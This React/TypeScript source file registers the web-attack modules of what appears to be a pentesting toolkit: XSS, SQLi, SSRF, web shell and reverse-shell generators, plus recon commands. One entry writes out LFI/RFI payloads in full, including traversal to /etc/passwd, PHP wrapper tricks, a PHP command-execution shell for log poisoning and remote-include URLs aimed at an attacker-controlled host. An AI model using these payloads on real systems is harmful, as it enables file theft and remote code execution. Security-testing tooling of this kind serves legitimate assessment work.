import React from 'react';
import type { Tool } from '../../../types';
import {
    ARG_OUTPUT, ARG_WL_SUB, ARG_WL_VHOST, ARG_WL_DIR, ARG_HTTPS,
    getUrlPrefix, formatTargetWithPort
} from '../../../utils/toolHelpers';

// ====================================================================
// WEB TOOLS - Consolidated from multiple sources
// ====================================================================

export const WEB_TOOLS: Tool[] = [
    // --- XSS ---
    {
        id: 'xss_payloads',
        name: 'XSS Payloads',
        category: 'WEB',
        subcategory: 'XSS',
        desc: 'XSS payload templates for filter bypass and code execution',
        authMode: 'none',
        source: 'hacktools',
        component: React.lazy(() => import('../components/XSSPayloads')),
        generate: () => '',
    },
    {
        id: 'xss_obfuscator',
        name: 'XSS Obfuscator',
        category: 'WEB',
        subcategory: 'XSS',
        desc: 'Obfuscate XSS payloads to bypass WAF and filters',
        authMode: 'none',
        source: 'hacktools',
        component: React.lazy(() => import('../components/XSSObfuscator')),
        generate: () => '',
    },

    // --- SQLi ---
    {
        id: 'sqli_payloads',
        name: 'SQL Injection',
        category: 'WEB',
        subcategory: 'SQLi',
        desc: 'Interactive SQL syntax parser (AST) & injection payloads',
        authMode: 'none',
        source: 'hacktools',
        component: React.lazy(() => import('../components/SQLTool')),
        generate: () => '',
    },

    // --- NoSQLi ---
    {
        id: 'nosql_injection',
        name: 'NoSQL Injection',
        category: 'WEB',
        subcategory: 'NoSQLi',
        desc: 'MongoDB, CouchDB, and NoSQL database injection payloads',
        authMode: 'none',
        generate: () => '',
        source: 'hacktools',
        component: React.lazy(() => import('../components/NoSQLTool')),
    },

    // --- SSTI ---
    {
        id: 'ssti_payloads',
        name: 'SSTI Payloads',
        category: 'WEB',
        subcategory: 'SSTI',
        desc: 'Interactive Server-Side Template Injection payload generator',
        authMode: 'none',
        generate: () => '',
        source: 'hacktools',
        component: React.lazy(() => import('../components/SSTITool')),
    },

    // --- File Inclusion ---
    {
        id: 'lfi_rfi',
        name: 'LFI/RFI Payloads',
        category: 'WEB',
        subcategory: 'File Inclusion',
        desc: 'Local and Remote File Inclusion payloads',
        authMode: 'none',
        source: 'hacktools',
        generate: () => `# Basic LFI
../../../etc/passwd
....//....//....//etc/passwd
..%252f..%252f..%252fetc/passwd
..%c0%af..%c0%af..%c0%afetc/passwd

# Windows LFI
..\\\\..\\\\..\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts
C:\\\\Windows\\\\System32\\\\drivers\\\\etc\\\\hosts

# Null Byte (PHP < 5.3.4)
../../../etc/passwd%00
../../../etc/passwd%00.jpg

# PHP Wrappers
php://filter/convert.base64-encode/resource=index.php
php://input
php://data:text/plain,<?php system($_GET['cmd']);?>
expect://id
phar://path/to/file.phar

# Log Poisoning
/var/log/apache2/access.log
/var/log/nginx/access.log
# Inject: <?php system($_GET['cmd']); ?> in User-Agent

# /proc/self/environ
User-Agent: <?php system($_GET['cmd']); ?>
../../../proc/self/environ

# RFI
http://YOURIP/shell.txt
http://YOURIP/shell.txt%00`,
    },
    {
        id: 'php_filter_chain',
        name: 'PHP Filter Chain',
        category: 'WEB',
        subcategory: 'File Inclusion',
        desc: 'Generate PHP filter chains for LFI to RCE exploitation (Oracle Free)',
        authMode: 'none',
        generate: () => '',
        source: 'hacktools',
        component: React.lazy(() => import('../components/PHPFilterChainTool')),
    },
    {
        id: 'path_traversal_tool',
        name: 'Path Traversal',
        category: 'WEB',
        subcategory: 'File Inclusion',
        desc: 'LFI/RFI payloads and Zip Slip exploitation',
        authMode: 'none',
        generate: () => '',
        source: 'hacktools',
        component: React.lazy(() => import('../components/PathTraversalTool')),
    },

    // --- XXE ---
    {
        id: 'xxe_payloads',
        name: 'XXE Injection',
        category: 'WEB',
        subcategory: 'XXE',
        desc: 'Interactive XML External Entity payload generator (In-band & OOB)',
        authMode: 'none',
        generate: () => '',
        source: 'hacktools',
        component: React.lazy(() => import('../components/XXETool')),
    },

    // --- CSRF ---
    {
        id: 'csrf_tool',
        name: 'CSRF Generator',
        category: 'WEB',
        subcategory: 'CSRF',
        desc: 'Cross-Site Request Forgery PoC HTML form generator from raw HTTP requests',
        authMode: 'none',
        generate: () => '',
        source: 'hacktools',
        component: React.lazy(() => import('../components/CSRFTool')),
    },

    // --- SSRF ---
    {
        id: 'ssrf_tool',
        name: 'SSRF Payloads',
        category: 'WEB',
        subcategory: 'SSRF',
        desc: 'Server-Side Request Forgery attacks: Cloud metadata, IP obfuscation, XXE, Gopher',
        authMode: 'none',
        generate: () => '',
        source: 'hacktools',
        component: React.lazy(() => import('../components/SSRFTool')),
    },
    {
        id: 'gopherizer_tool',
        name: 'Gopherizer',
        category: 'WEB',
        subcategory: 'SSRF',
        desc: 'Generate Gopher payloads for SSRF exploitation (MySQL, Postgres, Memcached)',
        authMode: 'none',
        generate: () => '',
        source: 'hacktools',
        component: React.lazy(() => import('../components/GopherizerTool')),
    },

    // --- Web Shells ---
    {
        id: 'webshell_tool',
        name: 'Web Shells',
        category: 'WEB',
        subcategory: 'Web Shells',
        desc: 'PHP, ASP.NET, and Java/JSP web shell generator',
        authMode: 'none',
        generate: () => '',
        source: 'hacktools',
        component: React.lazy(() => import('../components/WebShellTool')),
    },

    // --- Shells & Payloads ---
    {
        id: 'revshell',
        name: 'Reverse Shell Generator',
        category: 'WEB',
        subcategory: 'Shells & Payloads',
        desc: 'Generate reverse shell payloads for 56+ languages and platforms (bash, python, powershell, nc, java, etc.)',
        authMode: 'none',
        generate: () => '',
        source: 'hacktools',
        component: React.lazy(() => import('../components/ReverseShell')),
    },
    {
        id: 'msfvenom_builder',
        name: 'MSFVenom Builder',
        category: 'WEB',
        subcategory: 'Shells & Payloads',
        desc: 'Interactive MSFVenom payload generator with visual interface. Configure payload, encoder, format, and more.',
        authMode: 'none',
        generate: () => '',
        source: 'hacktools',
        component: React.lazy(() => import('../components/MSFVenomBuilder')),
    },

    // --- Data Manipulation ---
    {
        id: 'data_encoding',
        name: 'Data Encoding',
        category: 'WEB',
        subcategory: 'Data Manipulation',
        desc: 'URL, HTML, Base64, Hex, Unicode encoding and decoding utilities',
        authMode: 'none',
        generate: () => '',
        source: 'hacktools',
        component: React.lazy(() => import('../components/DataEncodingTool')),
    },

    // --- JWT ---
    {
        id: 'jwt_tool',
        name: 'JWT Decoder',
        category: 'WEB',
        subcategory: 'JWT',
        desc: 'JSON Web Token decoder and "none" algorithm attack generator',
        authMode: 'none',
        generate: () => '',
        source: 'hacktools',
        component: React.lazy(() => import('../components/JWTTool')),
    },

    // --- Subdomain Enum ---
    {
        id: 'subdomain_all',
        name: 'All-in-One Subdomain',
        category: 'WEB',
        subcategory: 'Subdomain Enum',
        desc: 'Combined enumeration: Subfinder, Assetfinder, Dig (AXFR), and FFUF (VHost).',
        authMode: 'none',
        generate: (v, args) => {
            const domain = v.target || '$TARGET';

            return `# 1. Subfinder
subfinder -d ${domain} -silent -o subfinder.txt

# 2. Assetfinder
assetfinder --subs-only ${domain} > assetfinder.txt

# 3. Dig AXFR (Zone Transfer)
dig axfr @${domain} ${domain} > dig_axfr.txt

# 4. FFUF VHost
ffuf -u http://${domain} -H "Host: FUZZ.${domain}" -w ${args.wordlistSub || '$WORDLIST_SUBDOMAIN'} -ic -mc all -s -o ffuf_vhost.txt

# 5. Combine & Sort
cat subfinder.txt assetfinder.txt dig_axfr.txt ffuf_vhost.txt> all_raw.txt
sort -u all_raw.txt`;
        }
    },

    // --- Fingerprinting ---
    {
        id: 'httpx',
        name: 'Httpx',
        category: 'WEB',
        subcategory: 'Fingerprinting',
        desc: 'HTTP toolkit for single target.',
        authMode: 'none',
        args: [],
        generate: (v) => {
            return `httpx -list -status-code -title -no-fallback ${v.filepath || '$FILEPATH'}`;
        }
    },
    {
        id: 'gowitness',
        name: 'Gowitness',
        category: 'WEB',
        subcategory: 'Fingerprinting',
        desc: 'Screenshot utility_FILE.',
        authMode: 'none',
        args: [],
        generate: (v, args) => {
            return `cat ${v.filepath || '$FILEPATH'} | gowitness scan file -f - --write-db && gowitness report server --db-uri sqlite://gowitness.sqlite3 --screenshot-path ./screenshots --port 7171`;
        }
    },
];
